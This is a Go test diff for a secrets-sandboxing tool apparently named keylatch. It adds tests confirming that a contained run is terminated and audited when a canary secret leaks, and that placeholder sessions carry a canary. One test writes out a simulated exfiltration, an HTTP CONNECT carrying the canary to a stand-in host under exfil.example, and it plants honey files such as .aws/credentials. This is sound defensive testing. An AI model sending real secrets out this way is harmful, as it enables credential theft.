@@ -27,6 +27,7 @@ import (
 	"github.com/keylatch/keylatch/internal/audit"
 	"github.com/keylatch/keylatch/internal/contained"
 	"github.com/keylatch/keylatch/internal/exitcode"
+	"github.com/keylatch/keylatch/internal/placeholder"
 	"github.com/keylatch/keylatch/internal/policy/enforce"
 	"github.com/keylatch/keylatch/internal/redactor"
 	"github.com/keylatch/keylatch/internal/registry"
@@ -753,4 +754,82 @@ func TestPlanDigestChangesWithTheSandbox(t *testing.T) {
 		many = append(many, redactor.Finding{Path: fmt.Sprintf("/r/f%d", i)})
 	}
 	assert.Equal(t, "f0, f1, f2, f3, f4, and 2 more", findingPaths(many, "/r"))
+}
+
+func TestContainedRunEndsWhenADecoyLeavesTheSandbox(t *testing.T) {
+	w := newContainedWorld(t)
+	w.launcher.script = func(contained.Spec, *fakeChild) {}
+	conn := w.connect(context.Background())
+	require.NoError(t, writeFrame(conn, w.request()))
+	r := bufio.NewReader(conn)
+	var first Response
+	require.NoError(t, readFrame(r, &first, maxFrame))
+	require.True(t, first.More)
+
+	spec := w.launcher.spec()
+	var decoy string
+	for _, e := range spec.Env {
+		if v, ok := strings.CutPrefix(e, "KEYLATCH_CANARY_STRIPE="); ok {
+			decoy = v
+		}
+	}
+	require.NotEmpty(t, decoy, "the sandbox is given a canary")
+	paths := map[string]string{}
+	for _, h := range spec.Honey {
+		paths[h.Path] = h.Content
+	}
+	assert.Contains(t, paths, ".aws/credentials")
+	assert.Contains(t, paths, ".npmrc")
+
+	l := <-w.egress
+	c, err := net.Dial("tcp", l.Addr().String())
+	require.NoError(t, err)
+	_ = c.SetDeadline(time.Now().Add(5 * time.Second))
+	_, _ = fmt.Fprintf(c, "CONNECT %s.exfil.example:443 HTTP/1.1\r\nHost: x\r\n\r\n", decoy)
+	out, _ := io.ReadAll(c)
+	_ = c.Close()
+	assert.Contains(t, string(out), "403")
+
+	select {
+	case <-w.launcher.last.killed:
+	case <-time.After(10 * time.Second):
+		t.Fatal("the run kept going after a decoy left the sandbox")
+	}
+	var final Response
+	for {
+		require.NoError(t, readFrame(r, &final, maxFrame))
+		if !final.More {
+			break
+		}
+	}
+	assert.Equal(t, exitcode.SecurityBlock, final.ExitCode)
+	assert.Contains(t, final.Error, "canary")
+	tripped := w.events(audit.ActionCanaryTripped)
+	require.Len(t, tripped, 1)
+	assert.Equal(t, "connect_target", tripped[0].Extra["where"])
+	assert.NotContains(t, fmt.Sprint(tripped[0]), decoy)
+	exited := w.events(audit.ActionRunExited)
+	require.Len(t, exited, 1)
+	assert.Equal(t, "canary_tripped", exited[0].Extra["reason"])
+}
+
+func TestPlaceholderSessionCarriesACanary(t *testing.T) {
+	w := newContainedWorld(t)
+	mgr, err := placeholder.NewManager(placeholder.Config{Resolver: fixedResolver{"secret_key": containedSecret}, Audit: w.audit})
+	require.NoError(t, err)
+	t.Cleanup(mgr.Close)
+	w.srv.cfg.Placeholders = mgr
+
+	conn := w.connect(context.Background())
+	require.NoError(t, writeFrame(conn, Request{Op: OpRunSession, Run: &RunRequest{Connection: "stripe", Tier: TierPlaceholder, Command: []string{"true"}}}))
+	var resp Response
+	require.NoError(t, readFrame(bufio.NewReader(conn), &resp, maxFrame))
+	require.True(t, resp.OK, resp.Error)
+	var canaryEnv string
+	for _, e := range resp.Session.Env.Set {
+		if e.Name == "KEYLATCH_CANARY_STRIPE" {
+			canaryEnv = e.Value
+		}
+	}
+	assert.True(t, strings.HasPrefix(canaryEnv, "klc-canary-stripe-"), "the placeholder session sets a canary beside its placeholders")
 }
